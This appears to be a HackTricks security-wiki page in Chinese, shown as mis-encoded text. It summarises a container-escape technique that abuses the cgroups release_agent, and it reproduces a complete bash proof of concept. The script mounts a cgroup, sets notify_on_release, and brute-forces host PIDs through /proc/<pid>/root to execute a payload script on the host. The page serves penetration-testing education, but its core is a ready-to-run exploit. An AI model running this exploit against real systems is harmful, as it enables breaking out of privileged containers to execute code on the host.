{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
{% endhint %}

æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·**æŸ¥çœ‹æ¥è‡ª [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)** çš„åšå®¢æ–‡ç« ã€‚è¿™åªæ˜¯ä¸€ä¸ªæ‘˜è¦ï¼š

è¯¥æŠ€æœ¯æ¦‚è¿°äº†ä¸€ç§**ä»å®¹å™¨å†…æ‰§è¡Œä¸»æœºä»£ç **çš„æ–¹æ³•ï¼Œå…‹æœäº†å­˜å‚¨é©±åŠ¨ç¨‹åºé…ç½®å¸¦æ¥çš„æŒ‘æˆ˜ï¼Œè¿™äº›é…ç½®ä¼šæ¨¡ç³Šä¸»æœºä¸Šçš„å®¹å™¨æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ï¼Œä¾‹å¦‚ Kata Containers æˆ–ç‰¹å®šçš„ `devicemapper` è®¾ç½®ã€‚

å…³é”®æ­¥éª¤ï¼š

1. **å®šä½è¿›ç¨‹ ID (PIDs)ï¼š** ä½¿ç”¨ Linux ä¼ªæ–‡ä»¶ç³»ç»Ÿä¸­çš„ `/proc/<pid>/root` ç¬¦å·é“¾æ¥ï¼Œå¯ä»¥ç›¸å¯¹äºä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿè®¿é—®å®¹å™¨å†…çš„ä»»ä½•æ–‡ä»¶ã€‚è¿™ç»•è¿‡äº†éœ€è¦çŸ¥é“ä¸»æœºä¸Šå®¹å™¨æ–‡ä»¶ç³»ç»Ÿè·¯å¾„çš„è¦æ±‚ã€‚
2. **PID ç¢°æ’ï¼š** é‡‡ç”¨æš´åŠ›ç ´è§£çš„æ–¹æ³•æœç´¢ä¸»æœºä¸Šçš„ PIDsã€‚é€šè¿‡ä¾æ¬¡æ£€æŸ¥ `/proc/<pid>/root/<file>` ä¸­ç‰¹å®šæ–‡ä»¶çš„å­˜åœ¨æ¥å®Œæˆã€‚å½“æ‰¾åˆ°è¯¥æ–‡ä»¶æ—¶ï¼Œè¡¨æ˜ç›¸åº”çš„ PID å±äºåœ¨ç›®æ ‡å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹ã€‚
3. **è§¦å‘æ‰§è¡Œï¼š** çŒœæµ‹çš„ PID è·¯å¾„è¢«å†™å…¥ `cgroups release_agent` æ–‡ä»¶ã€‚æ­¤æ“ä½œè§¦å‘ `release_agent` çš„æ‰§è¡Œã€‚é€šè¿‡æ£€æŸ¥è¾“å‡ºæ–‡ä»¶çš„åˆ›å»ºæ¥ç¡®è®¤æ­¤æ­¥éª¤çš„æˆåŠŸã€‚

### åˆ©ç”¨è¿‡ç¨‹

åˆ©ç”¨è¿‡ç¨‹æ¶‰åŠä¸€ç³»åˆ—æ›´è¯¦ç»†çš„æ“ä½œï¼Œæ—¨åœ¨é€šè¿‡çŒœæµ‹åœ¨å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹çš„æ­£ç¡® PID æ¥åœ¨ä¸»æœºä¸Šæ‰§è¡Œæœ‰æ•ˆè½½è·ã€‚ä»¥ä¸‹æ˜¯å…¶å±•å¼€æ–¹å¼ï¼š

1. **åˆå§‹åŒ–ç¯å¢ƒï¼š** åœ¨ä¸»æœºä¸Šå‡†å¤‡ä¸€ä¸ªæœ‰æ•ˆè½½è·è„šæœ¬ (`payload.sh`)ï¼Œå¹¶ä¸º cgroup æ“ä½œåˆ›å»ºä¸€ä¸ªå”¯ä¸€ç›®å½•ã€‚
2. **å‡†å¤‡æœ‰æ•ˆè½½è·ï¼š** ç¼–å†™å¹¶ä½¿æœ‰æ•ˆè½½è·è„šæœ¬å¯æ‰§è¡Œï¼Œè¯¥è„šæœ¬åŒ…å«è¦åœ¨ä¸»æœºä¸Šæ‰§è¡Œçš„å‘½ä»¤ã€‚
3. **è®¾ç½® Cgroupï¼š** æŒ‚è½½å¹¶é…ç½® cgroupã€‚è®¾ç½® `notify_on_release` æ ‡å¿—ï¼Œä»¥ç¡®ä¿åœ¨é‡Šæ”¾ cgroup æ—¶æ‰§è¡Œæœ‰æ•ˆè½½è·ã€‚
4. **æš´åŠ›ç ´è§£ PIDï¼š** å¾ªç¯éå†æ½œåœ¨çš„ PIDsï¼Œå°†æ¯ä¸ªçŒœæµ‹çš„ PID å†™å…¥ `release_agent` æ–‡ä»¶ã€‚è¿™æœ‰æ•ˆåœ°å°†æœ‰æ•ˆè½½è·è„šæœ¬è®¾ç½®ä¸º `release_agent`ã€‚
5. **è§¦å‘å¹¶æ£€æŸ¥æ‰§è¡Œï¼š** å¯¹äºæ¯ä¸ª PIDï¼Œå†™å…¥ cgroup çš„ `cgroup.procs`ï¼Œå¦‚æœ PID æ­£ç¡®ï¼Œåˆ™è§¦å‘ `release_agent` çš„æ‰§è¡Œã€‚å¾ªç¯ç»§ç»­ï¼Œç›´åˆ°æ‰¾åˆ°æœ‰æ•ˆè½½è·è„šæœ¬çš„è¾“å‡ºï¼Œè¡¨æ˜æ‰§è¡ŒæˆåŠŸã€‚

æ¥è‡ªåšå®¢æ–‡ç« çš„ PoC:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
</details>
{% endhint %}
